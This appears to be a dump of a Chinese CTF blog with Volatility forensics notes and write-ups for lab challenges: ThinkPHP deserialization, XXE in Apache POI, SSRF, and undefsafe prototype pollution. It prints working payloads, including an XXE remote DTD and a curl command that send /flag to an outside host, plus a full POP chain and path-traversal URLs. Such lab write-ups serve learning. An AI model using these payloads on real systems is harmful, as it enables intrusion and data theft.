- 列出大页面池命令历史- windows.cmdscan.CmdScan - 查找Windows命令历史列表磁盘与存储- windows.mbrscan.MBRScan - 扫描并解析潜在的主引导记录（MBR）- windows.truecrypt.Passphrase - TrueCrypt缓存密码查找器扫描插件- windows.poolscanner.PoolScanner - 通用池扫描插件通用插件- regexscan.RegExScan - 使用正则表达式模式扫描内核内存- yarascan.YaraScan - 使用yara规则（字符串或文件）扫描内核内存- timeliner.Timeliner - 运行所有提供时间相关信息的插件，并按时间排序结果- vmscan.Vmscan - 扫描Intel VT-d结构并为它们生成VM volatility配置- windows.strings.Strings - 读取strings命令的输出，并指示每个字符串属于哪个进程注意：标记为&quot;（已弃用）&quot;的插件在较新版本的Volatility 3中可能有替代插件或已不再维护。\n\n\n\n\n\n常用命令\n常用插件命令（以当版本插件为准）\n\n\n\nclipboard\n提取Windows剪贴板中的内容\n\n\n\ncmdscan\n提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）\n\n\ndumpfiles\n查看指定文件内容（导出缓存文件）\n\n\nenvars\n显示进程的环境变量\n\n\nfilescan\n提取文件对象（file objects）池信息（扫描文件）\n\n\nhashdump\n转储内存中的Windows帐户密码哈希(LM&#x2F;NTLM)\n\n\nimageinfo\n查看&#x2F;识别镜像信息\n\n\nmimikatz\n提取明文密码\n\n\nnetscan\n查看网络连接状态\n\n\nnotepad\n查看展示的记事本内容\n\n\neditbox\n查看编辑内容\n\n\npstree\n将进程显示为树状列表\n\n\nscreenshot\n获取系统在此刻的截图\n\n\n查看识别镜像信息\nvol.py -f 文件名 windows.info.Infopython vol.py -f Keyboard.raw windows.info.Info#查看/识别镜像信息\n\n随着更新有一些命令和以前不一样了，主要还是遵循当前提供的插件\n\n\n我们可以从输出信息中看见Windows版本为win7sp1，然后输出Is64Bit我们可以判断是64位操作系统，于是我们可以选择profile为Win7SP1x64，话说老版本输出有推荐profile，为什么新版本反而没有了，可能是因为这个版本好像可以自动识别profile\n指定镜像版本并filescan扫描文件再过滤输出\nvol.py -f 文件名 --profile=镜像版本 windows.filescan.FileScan | grep &quot;文件名&quot;#volality3自动识别镜像版本\tvol.py -f Keyboard.raw  windows.filescan.FileScan | grep &quot;keyboard&quot;\t#指定镜像版本并filescan扫描文件再过滤输出#Windows版本python vol.py -f Keyboard.raw windows.filescan.FileScan | findstr /i &quot;keyboard&quot;\n\n我们可以通过这个命令来扫描文件，然后通过grep命令来查找关键字\n\n\n我们可以看到各个文件前面有其对应的内存地址，我们只需要通过访问其地址然后导出文件即可\n指定镜像版本并dumpfiles指定文件，指定内存中的偏移量并导出到当前文件夹下面的test目录\nvol.py -f 文件名 -o 保存路径 windows.dumpfiles.DumpFiles --physaddr 偏移量python3 vol.py -f Keyboard.raw -o ./data windows.dumpfiles.DumpFiles --physaddr 0x3d700880#指定镜像版本并dumpfiles指定文件，指定内存中的偏移量并导出到当前文件夹下面的test目录\n\n其中我们可以看看dumpfiles插件的参数，我们使用地址提取文件的时候virtaddr和physaddr都尝试一下\nVolatility 3 Framework 2.26.2用法: vol.py windows.dumpfiles.DumpFiles [-h] [--pid PID] [--virtaddr [VIRTADDR ...]] [--physaddr [PHYSADDR ...]] [--filter FILTER]                                          [--ignore-case]从Windows内存样本中导出缓存的文件内容。选项:  -h, --help            显示此帮助信息并退出  --pid PID             包含的进程ID（其他所有进程将被排除）  --virtaddr [VIRTADDR ...]                        导出给定虚拟地址的_FILE_OBJECTs  --physaddr [PHYSADDR ...]                        导出给定物理地址的_FILE_OBJECTs  --filter FILTER       导出匹配正则表达式FILTER的文件  --ignore-case         在过滤匹配时忽略大小写\n\n\n\n这么多命令我们肯定是自己写不完了，我们还是在使用的时候再去翻一下插件和参数，反正我的想法就是直接Lovelymen梭哈\n其他7z解压vmdk文件得到磁盘文件VMDK是VMware虚拟机的虚拟磁盘文件，它模拟了物理磁盘的完整结构：\nVMDK文件├── 头部元数据（描述符、几何信息等）├── **完整的分区表**（MBR或GPT）│   ├── 分区1（可能是FAT/NTFS/EXT4文件系统）│   ├── 分区2│   └── ...└── 可能的快照数据、增量数据\n\n也就是说其实VMDK文件包含了各种文件系统，我们需要根据其中的文件系统来判断出我们该如何去挂载\n于是我们可以使用7z来将其中的文件系统解压出来，得到的也是一个可以挂载的文件\n\n"},{"title":"磐石行动","url":"/2025/08/14/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8/","content":"磐石行动2025初赛1.Misc为什么先从Misc开始，web除了签到题其他都不会写，官方现在也没有复现平台，也就只有Misc下载了一两个文件，而且这次我Misc有一个50分的题目都没写出来，一开始是以为我有什么东西没想到，结果流量分析考的却是我不会的东西。太菜了\n1.derderjia下载下附件是一个流量包，直接看流量发现是一个通过万能密码登录然后通过命令注入进行RCE的流量包\n题目描述为:\n该死，一头狡猾的马攻击了我的服务器，并在上面上传了一个隐秘的文件，请你帮我找到这个文件，来惩治它。该死，一头狡猾的马攻击了我的服务器，并在上面上传了一个隐秘的文件，请你帮我找到这个文件，来惩治它。\n\n上传了一个文件一开始我理解为可能是写马之类的行为，就看见这个请求头\n\n\n向proof.txt中写入一串疑似flag，如果这里就是flag了这就属于一道签到题的难度，但实际这个和拿到flag没有任何关系\n我们在最后一个请求头发现一个神秘数据\n\n\n当初拿到这个去问了DS，但是没有注意到他在最后说这是一个TLS密匙，以为只是一个简单的文件读取而已，也就是说这是一个被TLS密匙加密的流量包\n这一串数据为TLS密匙，我们将其保存至txt文件中，然后\n编辑-&gt;首选项-&gt;protocols-&gt;TLS\n\n\n\n然后流量包被解密，我们发现多出来了一个&#x2F;upload路由的请求头\n\n\n查看HTTP追踪流发现一个压缩包，我们将其导出为zip文件，发现为真加密文件\n再次查看流量包发现最后面两个流量包传输了base64字符，将其解码为\n\n\n密码为\nPanShi2025!\n\n解码为一张图片，没发现flag，直接丢入随波逐流中发现长度被改了，直接自动修复了\n\n\n"},{"title":"[红明谷CTF_2021]EasyTP","url":"/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/","content":"[红明谷CTF_2021]EasyTP看见这个熟悉的Easy和后面的TP，这很容易让我想到这是一道很难的ThinkPHP的代码审计题目\n我们直接www.zip将源码下载下来，在ThinkPHP/ThinkPHP.php中发现了ThinkPHP的版本为3.2.3\n\n\n于是直接百度这个版本的漏洞\n在CVE上面只看到了是sql注入漏洞，后面又在网上找到了大佬的文章\n实在没想到这是一个反序列化结合sql注入的漏洞\n但是我发现从题目上下载下来的www.zip好像不全，为此我还专程把源码给下载下来了，但是下载了源码发现好像缺失了一些文件，查了之后发现需要在网站根目录下运行一下靶场才能加载完成，但仔细看了才发现是一样的\n造成我误以为文件缺失的一个重要原因就是我看不懂ThinkPHP框架的代码，我们最后进行反序列化的url是\n/index.php/Home/Index/test\n\n这个就和我们一般的url不一样，php文件后面又接着接了路径而且路径末尾并没有指向php文件，这就是我看不懂的地方\n看了一下ThinkPHP的路由规则，实在有点难，不同版本的路由规则也不同，还有好几种路由解析模式，我只能看下我们默认的PATH_INFO模式\nThinkPHP 使用 “模块&#x2F;控制器&#x2F;方法” 的路由格式，但 不要求物理文件路径匹配 URL。\n\n示例 URL：/Home/Index/test\nHome → 模块名（对应 application/Home 目录）\nIndex → 控制器名（对应 application/Home/controller/Index.php 文件）\ntest → 方法名（对应 Index 控制器中的 test() 方法）\n\n\n\n正如我们所见，ThinkPHP中应该使用的是层层递进的方式，模块包含控制器，然后控制器包含方法\n于是我们这个url访问的实际是\n\n\n和这个是一样的\n这个文件也是我们进行反序列化的起点\n看了很久，发现我对一门语言所知甚少，距离开发的距离不是一般远，有很多可以违背我原来常识的地方，可以通过代码自定义配置，也可以通过代码写出一些可以直接调用的自定义函数\n比如说这个题目是怎么通过在一个php文件中进行反序列化然后影响其他文件中类的属性\n我们先来看这道题目的payload\n&lt;?phpnamespace Think\\Db\\Driver&#123;    use PDO;    class Mysql&#123;        protected $options = array(            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // 开启才能读取文件        );        protected $config = array(            &quot;debug&quot;    =&gt; 1,            &quot;database&quot; =&gt; &quot;thinkphp3&quot;,            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,            &quot;hostport&quot; =&gt; &quot;3306&quot;,            &quot;charset&quot;  =&gt; &quot;utf8&quot;,            &quot;username&quot; =&gt; &quot;root&quot;,            &quot;password&quot; =&gt; &quot;&quot;        );    &#125;&#125;namespace Think\\Image\\Driver&#123;    use Think\\Session\\Driver\\Memcache;    class Imagick&#123;        private $img;        public function __construct()&#123;            $this-&gt;img = new Memcache();        &#125;    &#125;&#125;namespace Think\\Session\\Driver&#123;    use Think\\Model;    class Memcache&#123;        protected $handle;        public function __construct()&#123;            $this-&gt;handle = new Model();        &#125;    &#125;&#125;namespace Think&#123;    use Think\\Db\\Driver\\Mysql;    class Model&#123;        protected $options   = array();        protected $pk;        protected $data = array();        protected $db = null;        public function __construct()&#123;            $this-&gt;db = new Mysql();            $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;;            $this-&gt;pk = &#x27;id&#x27;;            $this-&gt;data[$this-&gt;pk] = array(                &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;,                &quot;where&quot; =&gt; &quot;1=1&quot;            );        &#125;    &#125;&#125;namespace &#123;    echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125;\n\n\n\nThinkPHP（尤其是 3.x 版本）使用 类名映射文件路径 的自动加载机制，例如：\n\nThink\\Image\\Driver\\Imagick → 对应文件 Think/Image/Driver/Imagick.class.php\nThink\\Model → 对应文件 Think/Model.class.php\n\n当反序列化一个对象时：\n\nPHP 根据序列化字符串中的类名（如 Think\\Image\\Driver\\Imagick）自动加载对应的类文件。\n由于 ThinkPHP 的类文件已经被加载到内存中，反序列化后的对象可以直接访问这些类的属性和方法，即使它们分布在不同的文件中。\n\n我们可以看到EXP中\nnamespace Think\\Db\\Driver&#123;    use PDO;    class Mysql&#123;        protected $options = array(            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // 开启才能读取文件        );        protected $config = array(            &quot;debug&quot;    =&gt; 1,            &quot;database&quot; =&gt; &quot;thinkphp3&quot;,            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,            &quot;hostport&quot; =&gt; &quot;3306&quot;,            &quot;charset&quot;  =&gt; &quot;utf8&quot;,            &quot;username&quot; =&gt; &quot;root&quot;,            &quot;password&quot; =&gt; &quot;&quot;        );    &#125;&#125;\n\n通过namespace Think\\Db\\Driver即可加载到Think\\Db\\Driver目录下去，然后又有class Mysql加载Mysql.class.php(感觉就是专门用来存放类的php文件)，\n当反序列化一个对象时：\n\nPHP 根据序列化字符串中的类名（如 Think\\Image\\Driver\\Imagick）自动加载对应的类文件。\n由于 ThinkPHP 的类文件已经被加载到内存中，反序列化后的对象可以直接访问这些类的属性和方法，即使它们分布在不同的文件中。\n\n这估计就是为什么可以直接实现pop链的构造\n但是这个题目对于我来说实在太难了等到后面我有实力了再回来写完吧，只需要使用上面那个exp的结果进行报错注入即可拿到flag\n"},{"title":"[网鼎杯_2020_青龙组]filejava","url":"/2025/10/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/","content":"[网鼎杯_2020_青龙组]filejava题目进去是一个文件上传的界面，尝试上传php文件，发现其将我们的上传文件作为静态文件处理，不会被解析但是会被下载下来\n尝试进行目录穿越发现\n\n\n他对我们上传文件之后在前面加了前缀，导致我们不能进行目录穿越，而且这个报错是Tomcat也就表示这个是Java项目，题目里面也说了是Java\n但是我们查看源码发现\n\n\n下载文件不是通过直接访问而是传递参数进行下载，也就是说这里我们可以通过目录穿越实现任意文件下载，我们顶多下载源码，题目肯定不会这么简单，后面看到代码才发现是读取文件的时候过滤掉了flag\n在这之前我们需要学习一下Tomcat的项目结构，之前对于Apache部署php代码的时候太简单粗暴了\nTomcat项目结构我们在IDEA写Java项目的时候，会根据我们选择的框架有不同的项目结构，然后我们在通过Tomcat部署的时候执行mvn package会将我们的java文件编译为class文件输出到 target/classes/目录下，经过一系列操作后，内容被打包为内容被打包成 my-web-app.war 文件\n然后将war文件发送至Tomcat后会进行解压得到项目，这个项目结构和war的项目结构是一致的\n这种将java编译为class的行为可以有效的防止我们直接读取源码，php则是可以直接拿到源码\n然后这是一个标准项目的项目结构\nYourWebAppName/       # Web应用的根目录，也是网站的根路径 `/`│├── WEB-INF/          # 【关键目录】此目录下的所有文件对客户端不可直接访问，只能由服务器访问。│   ││   ├── web.xml       # 【核心配置文件】定义Servlet、过滤器、监听器、欢迎页面等。这是审计的首要目标。│   ││   ├── classes/      # 【核心代码目录】存放编译后的Java类文件（.class文件）。│   │   └── com/yourcompany/yourapp/│   │       └── YourServlet.class│   ││   └── lib/          # 【依赖库目录】存放项目依赖的JAR包（如数据库驱动、工具包等）。这里是反序列化漏洞的“武器库”。│       ├── mysql-connector.jar│       └── commons-collections-3.2.1.jar│├── META-INF/         # 存放应用元数据信息，通常不敏感。│   └── MANIFEST.MF│└── **其他Web资源文件**  # 这些文件可以被客户端直接访问。    ├── index.html    ├── index.jsp    ├── login.jsp    ├── css/    ├── js/    ├── images/    └── upload/       # 如果存在上传功能，这个目录可能可被直接访问，用于存放上传的文件。\n\nTomcat应用默认部署在 webapps 目录下，每个子目录对应一个Web应用（例如 webapps&#x2F;项目名）。而 ROOT 是Tomcat的根应用目录，访问时无需在URL中添加项目名。例如，部署在 ROOT 中的应用可直接通过 http://localhost:8080/ 访问。\nWEB-INF 是Java Web应用的标准目录，存放配置文件（如 web.xml）和编译后的类文件（.class）。因此，ROOT&#x2F;WEB-INF&#x2F;web.xml 是该根应用的核心配置文件 。\n获取flag我们根据报错信息可以拿到项目路径，然后通过目录穿越访问到web.xml获取配置信息\n/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml\n\n打开xml文件\n\n\n我们可以根据这个路径下载下来对应的class文件\nDownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class\n\n将DownloadServlet和UploadServlet下载下来以后使用JD-UI进行反编译\n然后在UploadServlet中发现关键代码\n        if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName))//首先检查文件名的格式是否为excel-*.xlsx          try &#123;            Workbook wb1 = WorkbookFactory.create(in);// 从输入流创建Excel工作簿对象            Sheet sheet = wb1.getSheetAt(0);// 获取第一个工作表            System.out.println(sheet.getFirstRowNum());// 输出第一行的行号（通常是0）          &#125; catch (InvalidFormatException e) &#123;            System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);            e.printStackTrace();          &#125;\n\n然后我们这个题目的漏洞主要在于\nWorkbook wb1 = WorkbookFactory.create(in);  // 可能解析外部实体！\n\n详细的去查看CVE-2014-3529\n我们可以通过创建包含XXE payload的Excel文件实现文件读取\n我们先创建一个excel-flag.xlsx文件用来上传然后加载远程恶意dtd文件，为什么要这样就不知道了\n我们将其后缀改为zip然后进行解压往[Content_Types].xml中第二行加入\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://10.88.15.84:1999/file.dtd&quot;&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;\n\n就会通过SYSTEM远程加载我们的恶意dtd文件\n然后再将其进行压缩为zip，压缩后再改后缀为xlsx\n然后我们再在我们的VPS上准备dtd文件\n&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://10.88.15.84:7777/%file;&#x27;&gt;&quot;&gt;\n\n然后就是监听端口，上传文件后就会收到flag\n\n\npayload的原理大概是先通过remote变量加载外部dtd，加载了之后就触发all往我们的靶机中外带\n至于为什么不直接发包\n这是因为在内部DTD中，参数实体不能用于定义其他通用实体\n&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://example.com/%file;&#x27;&gt;&quot;&gt;  &lt;!-- 这里违规！ --&gt;%all;  &lt;!-- 在内部DTD中，%all不能包含ENTITY定义 --&gt;]&gt;\n\n然后就是为什么不这样写\n&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY send SYSTEM &#x27;http://10.88.15.84:7777/%file;&#x27;&gt;\n\nxml参数在引用的时候才会加载，如果这样写发送过去的就是%file，但是在外部实体中是可以算作引用的会加载，也就是我们需要让目标通过访问我们的外部实体，然后在外部实体中加载file\n总之这个题目无论是出在线上还是线下，都是很难的，然后这个题目考到了漏洞信息收集和java代码审计以及xml外带数据，不愧是网鼎杯\n"},{"title":"[网鼎杯_2020_玄武组]SSRFMe","url":"/2025/10/19/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/","content":"[网鼎杯_2020_玄武组]SSRFMe又是个难题啊，难死了\n&lt;?phpfunction check_inner_ip($url)&#123;    $match_result=preg_match(&#x27;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/&#x27;,$url);//白名单过滤    if (!$match_result)    &#123;        die(&#x27;url fomat error&#x27;);    &#125;    try    &#123;        $url_parse=parse_url($url);    &#125;    catch(Exception $e)    &#123;        die(&#x27;url fomat error&#x27;);        return false;    &#125;    $hostname=$url_parse[&#x27;host&#x27;];//获取我们url的域名和ip    $ip=gethostbyname($hostname);//返回域名对应的ipv4地址    $int_ip=ip2long($ip);//将ip转化为整数    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;//过滤掉了一些内网ip&#125;function safe_request_url($url)&#123;    if (check_inner_ip($url))//我们需要让check_inner_ip返回false    &#123;        echo $url.&#x27; is inner ip&#x27;;    &#125;    else    &#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);//执行curl        $result_info = curl_getinfo($ch);        if ($result_info[&#x27;redirect_url&#x27;])        &#123;            safe_request_url($result_info[&#x27;redirect_url&#x27;]);//如果有重定向就继续访问        &#125;        curl_close($ch);        var_dump($output);    &#125;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = $_GET[&#x27;url&#x27;];    if(!empty($url))&#123;        safe_request_url($url);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;// Please visit hint.php locally.?&gt;\n\n这个代码一开始还是有点没看懂的，本来SSRF就没有特别明白，这下还来了按位过滤\n$int_ip=ip2long($ip);//将ip转化为整数return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;\n\n转化为整数就是将各个ip的二进制拼接在一起得到的整数\nIP:       192.168.1.1字节:     192      168      1        1二进制:   11000000 10101000 00000001 00000001整数:     11000000101010000000000100000001 = 3232235777\n\n然后使用位移运算符可以过滤不同的位置\n// 检查 127.0.0.0/8 网段ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24// 等价于：检查IP的第一个字节是否为127// 检查 10.0.0.0/8 网段  ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24// 等价于：检查IP的第一个字节是否为10// 检查 172.16.0.0/12 网段ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20// 等价于：检查IP的前12位是否为 172.16-172.31// 检查 192.168.0.0/16 网段ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16  // 等价于：检查IP的前16位是否为 192.168\n\n\n\n\n\n\n\n这个题目怎么这么难，还有主从复制，以后等我有实力了再来写\n","tags":["不会"]},{"title":"[网鼎杯_2020_青龙组]notes","url":"/2025/10/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/","content":"[网鼎杯_2020_青龙组]notes题目特别简洁，前端什么都没有直接给源码，是一道js的原型链污染\nvar express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);const undefsafe = require(&#x27;undefsafe&#x27;);const &#123; exec &#125; = require(&#x27;child_process&#x27;);var app = express();class Notes &#123;    constructor() &#123;        this.owner = &quot;whoknows&quot;;        this.num = 0;        this.note_list = &#123;&#125;;    &#125;    write_note(author, raw_note) &#123;        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;    &#125;    get_note(id) &#123;        var r = &#123;&#125;        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    &#125;    edit_note(id, author, raw) &#123;        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);    &#125;    get_all_notes() &#123;        return this.note_list;    &#125;    remove_note(id) &#123;        delete this.note_list[id];    &#125;&#125;var notes = new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);&#125;);app.route(&#x27;/add_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;);    &#125;)    .post(function(req, res) &#123;        let author = req.body.author;        let raw = req.body.raw;        if (author &amp;&amp; raw) &#123;            notes.write_note(author, raw);            res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/edit_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) &#123;            notes.edit_note(id, author, enote);            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/delete_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        if (id) &#123;            notes.remove_note(id);            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/notes&#x27;)    .get(function(req, res) &#123;        let q = req.query.q;        let a_note;        if (typeof(q) === &quot;undefined&quot;) &#123;            a_note = notes.get_all_notes();        &#125; else &#123;            a_note = notes.get_note(q);        &#125;        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);    &#125;)app.route(&#x27;/status&#x27;)    .get(function(req, res) &#123;        let commands = &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(`stdout: $&#123;stdout&#125;`);            &#125;);        &#125;        res.send(&#x27;OK&#x27;);        res.end();    &#125;)app.use(function(req, res, next) &#123;  res.status(404).send(&#x27;Sorry cant find that!&#x27;);&#125;);app.use(function(err, req, res, next) &#123;  console.error(err.stack);  res.status(500).send(&#x27;Something broke!&#x27;);&#125;);const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))\n\n这个代码看下来是很标志的原型链污染代码，命令执行直接拼接了不可直接控制的commands参数，虽然我没有看到undefsafe的具体代码，但是猜测这个函数存在原型链污染漏洞\n仔细看了一下大佬的题解才发现这是一个CVE漏洞，搞了半天漏洞还得去冲浪，谁可能知道这么多CVE漏洞啊\nUndefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性)不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性。\n我们先来看一下正常使用方式\nvar a = require(&quot;undefsafe&quot;);var object = &#123;    a: &#123;        b: &#123;            c: 1,            d: [1,2,3],            e: &#x27;rev1ve&#x27;        &#125;    &#125;&#125;;console.log(object.a.b.e)\n\n正常执行结果\n\n\n然后如果访问不存在的属性则会发生报错\n\n\n在编程时，代码量较大时，我们可能经常会遇到类似情况，导致程序无法正常运行，发送我们最讨厌的报错。那么 undefsafe 可以帮助我们解决这个问题\n\n\n我们可以看到虽然中间出现了访问不存在属性，但是输出结果却并没有报错而是回显undefined\n然后就是，如果目标存在undefsafe模块就可以用来修改属性值\n\n\n如果不存在则访问属性会在上层进行创建并赋值\n然后我们再来看下面代码\nvar a = require(&quot;undefsafe&quot;);var object = &#123;    a: &#123;        b: &#123;            c: 1,            d: [1,2,3],            e: &#x27;rev1ve&#x27;        &#125;    &#125;&#125;;var payload = &quot;__proto__.toString&quot;;a(object,payload,&quot;evilstring&quot;);console.log(object.toString);\n\n由于toString本身就是存在，我们通过Undefsafe将其更改成了我们想要执行的语句。也就是说当undefsafe()函数的第 2，3 个参数可控时，我们便可以污染 object 对象中的值（即使是不存在的属性也可以污染）\n看了大佬的解释一下就通畅了，就连那wp中祖传的.bb也知道是怎么回事了\n也就是说undefsafe第一个参数是对象，可以通过第二个参数访问到原型，然后将第三个参数写入属性，终于看到一个原型链污染的实例了\n我们再回到题目中\n    edit_note(id, author, raw) &#123;        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);//后面加的这个author，由于我们进行污染的时候属性是不存在的所以不会直接创建author而是直接往aaa中赋值        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);    &#125; //可以控制第二个和第三个参数app.route(&#x27;/edit_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;//将我们传入的参数进行赋值        if (id &amp;&amp; author &amp;&amp; enote) &#123;            notes.edit_note(id, author, enote);//调用edit_note            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);        &#125;    &#125;)\n\n于是我们可以通过/edit_note进行原型链污染，我们接着来看命令执行\napp.route(&#x27;/status&#x27;)    .get(function(req, res) &#123;        let commands = &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;//定义了一个commands对象        for (let index in commands) &#123;//会遍历所有的属性进行命令执行            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(`stdout: $&#123;stdout&#125;`);            &#125;);        &#125;        res.send(&#x27;OK&#x27;);        res.end();    &#125;)\n\n于是思路直接有了，就是原型链污染往Object中随便写一个属性中写上我们要执行的命令，然后访问/status路由的时候遍历commands对象的时候就会触发命令执行\n我们先访问/edit_note路由，然后POST传递\nid=__proto__.aaa&amp;author=curl -F &#x27;flag=@/flag&#x27; 10.88.15.84:7777&amp;raw=hhh\n\nraw就是为了凑数而已\n然后访问status进行命令执行\n\n\n成功拿到flag\n\n"},{"title":"[羊城杯_2020]EasySer","url":"/2025/06/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-EasySer/","content":"[羊城杯_2020]EasySer进入靶场，发现只有一个类似phpinfo的界面，没有有用信息。使用dirsearch扫出来star1.php(后面蚁剑连上发现在robots.txt中有提示)，访问发现是一个SSRF漏洞，需要我们输入url\n点开源码提示我们访问ser.php，猜测通过url访问，于是输入\nhttp://127.0.0.1/ser.php//或者http://127.0.0.1/star1.php\n\n来看star1.php的代码\n//star1.php&lt;?php    require_once(&#x27;ser.php&#x27;);    error_reporting(0);    $str = &#x27;url error&lt;br&gt;&#x27;;    $filter1= &#x27;/^http:\\/\\/127\\.0\\.0\\.1\\//i&#x27;;    $filter2 = &#x27;/.?f.?l.?a.?g.?/i&#x27;;    $url=$_GET[&#x27;path&#x27;];     $c=$_GET[&#x27;c&#x27;];     if(!preg_match($filter1, $url))&#123;        die($str);    &#125;    if 